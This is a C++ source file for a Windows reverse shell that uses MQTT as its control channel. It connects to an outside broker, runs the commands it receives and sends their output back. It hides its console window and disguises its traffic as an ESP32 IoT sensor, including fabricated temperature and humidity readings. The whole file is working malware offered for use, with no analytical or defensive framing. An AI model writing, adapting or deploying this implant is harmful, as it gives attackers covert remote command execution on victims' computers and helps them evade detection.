// MQTT REVERSE SHELL - C++ VERSION
// Requires Paho MQTT C++ library
// Compile: g++ mqtt_shell.cpp -o mqtt_shell.exe -lpaho-mqttpp3 -lpaho-mqtt3a -static

#include <mqtt/async_client.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <sstream>
#include <random>
#include <ctime>

#define BROKER "tcp://mqtt.eclipseprojects.io:1883"  // CHANGE THIS
#define CLIENT_ID "ESP32_Sensor_42"                   // Will be randomized

class MQTTCallback : public virtual mqtt::callback {
private:
    mqtt::async_client& client;
    std::string deviceId;
    
    std::string ExecuteCommand(const char* cmd) {
        char buffer[4096];
        std::string result;
        
        FILE* pipe = _popen(cmd, "r");
        if (pipe) {
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            _pclose(pipe);
        }
        return result.empty() ? "OK" : result;
    }
    
public:
    MQTTCallback(mqtt::async_client& cli, const std::string& id) 
        : client(cli), deviceId(id) {}
    
    void connected(const std::string& cause) override {
        // Subscribe to command topic
        client.subscribe("iot/" + deviceId + "/command", 1);
        
        // Send status
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        std::string status = "{\"device\":\"" + deviceId + 
            "\",\"status\":\"online\",\"host\":\"" + hostname + "\"}";
        client.publish("telemetry/" + deviceId + "/status", status, 1, false);
    }
    
    void message_arrived(mqtt::const_message_ptr msg) override {
        std::string payload = msg->to_string();
        
        // Parse command (simplified - real would use JSON)
        std::string cmd = payload;
        if (cmd.find("CMD:") == 0) {
            cmd = cmd.substr(4);
            
            std::string output = ExecuteCommand(cmd.c_str());
            
            // Send response
            std::string response = "{\"sensor\":\"cmd_response\",\"value\":\"" + 
                output + "\"}";
            client.publish("telemetry/" + deviceId + "/response", response, 1, false);
        }
    }
    
    void delivery_complete(mqtt::delivery_token_ptr tok) override {}
};

class MQTTShell {
private:
    std::string deviceId;
    std::unique_ptr<mqtt::async_client> client;
    std::unique_ptr<MQTTCallback> cb;
    
    std::string GenerateDeviceId() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        const char* hex = "0123456789abcdef";
        std::string id = "ESP32_";
        for (int i = 0; i < 8; i++) {
            id += hex[dis(gen)];
        }
        return id;
    }
    
    void SendTelemetry() {
        while (true) {
            if (client && client->is_connected()) {
                // Fake sensor data
                std::string telemetry = "{\"sensor\":\"environment\"," +
                    std::string("\"temperature\":") + 
                    std::to_string(20 + (rand() % 10)) + "," +
                    "\"humidity\":" + std::to_string(30 + (rand() % 40)) + "}";
                
                client->publish("telemetry/" + deviceId + "/sensors", 
                    telemetry, 0, false);
            }
            Sleep(60000);  // Every minute
        }
    }
    
public:
    MQTTShell() : deviceId(GenerateDeviceId()) {
        FreeConsole();
        srand(time(NULL));
    }
    
    void Run() {
        // Start telemetry thread
        std::thread(&MQTTShell::SendTelemetry, this).detach();
        
        while (true) {
            try {
                client = std::make_unique<mqtt::async_client>(BROKER, deviceId);
                
                mqtt::connect_options connOpts;
                connOpts.set_keep_alive_interval(20);
                connOpts.set_clean_session(true);
                
                cb = std::make_unique<MQTTCallback>(*client, deviceId);
                client->set_callback(*cb);
                
                client->connect(connOpts)->wait();
                
                // Stay connected
                while (client->is_connected()) {
                    Sleep(1000);
                }
                
            } catch (const mqtt::exception&) {
                // Connection failed, retry
            }
            
            Sleep(5000);
        }
    }
};

int main() {
    MQTTShell shell;
    shell.Run();
    return 0;
}